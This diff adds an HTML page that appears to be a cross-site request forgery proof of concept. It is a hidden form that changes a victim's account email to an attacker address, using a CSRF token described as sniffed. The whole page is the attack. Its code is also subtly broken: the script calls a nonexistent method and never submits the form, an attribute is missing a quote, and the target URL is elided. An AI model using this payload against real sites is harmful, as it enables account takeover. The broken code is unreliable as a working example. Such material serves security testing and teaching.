@@ -1,0 +1,15 @@
+
+    <body>
+        <form id= "submitME" action="http://....." method="GET">
+            <input type="hidden" name="email" value="attacker@mail.com"/>
+            <input type="hidden" name="telephone" value=""/>
+            <input type="hidden" name="country" value="Cert"/>
+            <input type="hidden" name="actione value="save"/>
+            <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" /> <!--Sniffing value of the token-->
+            <input type="submit" value="Submit request"/>
+        </form>
+        <script>
+            document.getElement("submitME")
+        </script>
+    </body>
+</html>
